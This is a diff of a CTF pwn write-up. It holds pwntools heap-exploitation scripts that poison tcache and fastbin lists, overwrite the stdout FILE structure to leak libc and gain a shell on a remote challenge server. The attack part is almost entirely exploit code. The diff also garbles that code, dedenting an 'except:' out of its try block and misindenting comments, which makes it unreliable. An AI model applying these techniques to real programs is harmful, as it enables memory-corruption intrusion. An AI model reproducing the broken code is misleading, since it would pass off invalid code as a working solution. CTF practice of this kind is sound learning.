@@ -83,7 +83,7 @@ free(0)
 edit(0,p64(0))
 free(1)
 edit(1,p64(0))
- 
+
 free(0)
 edit(0,p64(0))
 free(1)
@@ -359,11 +359,6 @@ https://bbs.pediy.com/user-home-919002.htm
 
 ```
 fastbin->fd=tcache[size]->fdfastbin->bk=&tcache[size]tcache[size]->fd=fastbin
-```
-
-
-
-```
 def choice(ch):
     p.sendlineafter(b'Your choice: ',str(ch))
 def Index(index):
@@ -389,11 +384,6 @@ def de(index1,index2):
 def free(index):
     choice(3)
     Index(index)
-```
-
-
-
-```
 add(1,0x30)
 add(4,0x20)
 add(2,0x30)
@@ -402,16 +392,11 @@ free(0)
 edit(0,p64(0))
 free(1)
 edit(1,p64(0))
- 
+
 free(0)
 edit(0,p64(0))
 free(1)
 free(2)
-```
-
-
-
-```
 add(0,0x30)
 add(1,0x30)
 add(4,0x20)
@@ -433,11 +418,6 @@ add(9,0x50)
 free(4)
 free(5)
 edit(5,'\x40')
-```
-
-
-
-```
 add(0,0x30)
 add(1,0x30)
 add(4,0x20)
@@ -472,11 +452,6 @@ free(9)
 free(2)
  
 edit(7,p64(0x65656565)+p64(0xe1))
-```
-
-
-
-```
 add(0,0x30)
 add(1,0x30)
 add(4,0x20)
@@ -526,23 +501,13 @@ edit(7,p64(0x65656565)+p64(0x41)+b'\x60\xe7')
 add(11,0x50)
 add(10,0x50)
 edit(10,p64(0xfbad1800)+p64(0)*4+p64(0x5fffffffffff)
-```
-
-
-
-```
 fastbin->bk=&tcache[size]
-```
-
-
-
-```
 from pwn import *
 context.log_level='debug'
 file='./leak'
 elf=ELF(file)
 libc=ELF('./libc/libc-2.27-64.so')
-#p=process(file)
+    #p=process(file)
 def pwn():
     p=remote('101.201.71.136', 20783)
     def choice(ch):
@@ -631,16 +596,12 @@ def pwn():
 while True:  
     try:
         pwn()
-    except:
+    
+except:
         continue
     break
-```
-
-
-
-```
 from pwn import *
-#context.log_level='debug'
+    #context.log_level='debug'
 file='./leak'
 elf=ELF(file)
 libc=ELF('./libc/libc-2.27-64.so')
@@ -689,12 +650,12 @@ for i in range(3):
     edit(9,p64(0)*2)
  
 free(0)
-#edit(0,p64(0)*2)
+    #edit(0,p64(0)*2)
  
 free(9)
  
 edit(0,'\x00')
-#edit(0,'\x60\xe7')
+    #edit(0,'\x60\xe7')
 add(2,0x90)
 add(10,0x90)
 gdb.attach(p)
@@ -721,8 +682,8 @@ edit(3,p64(0)*2+p64(0xfbad1800)+p64(0)*2+p64(0x31)+b'\x00')
 choice(6)
  
  
-#flag=p.recvuntil('}')
-#print(flag[-40:])
+    #flag=p.recvuntil('}')
+    #print(flag[-40:])
  
  
 p.interactive()
